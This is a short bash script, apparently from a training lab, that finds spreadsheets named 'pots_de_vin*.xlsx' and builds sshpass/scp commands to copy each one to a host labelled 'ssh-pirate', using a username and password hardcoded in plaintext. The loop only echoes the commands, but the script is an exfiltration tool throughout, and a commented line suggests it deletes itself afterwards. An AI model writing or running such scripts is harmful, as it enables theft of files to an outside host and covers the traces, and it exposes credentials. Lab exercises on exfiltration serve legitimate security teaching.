#!/bin/bash
username="etudiant"
password="vitrygtr"
Ip="177.16.1.4" # adresse de ssh-pirate

command=$(ls pots_de_vin*.xlsx)
for files in $command
do
    echo "sshpass -p "$password" scp $files $username@$Ip:/home/etudiant/data"
done

# rm exfiltration.sh


# scp file1 file2 more-files* user@remote:/some/dir/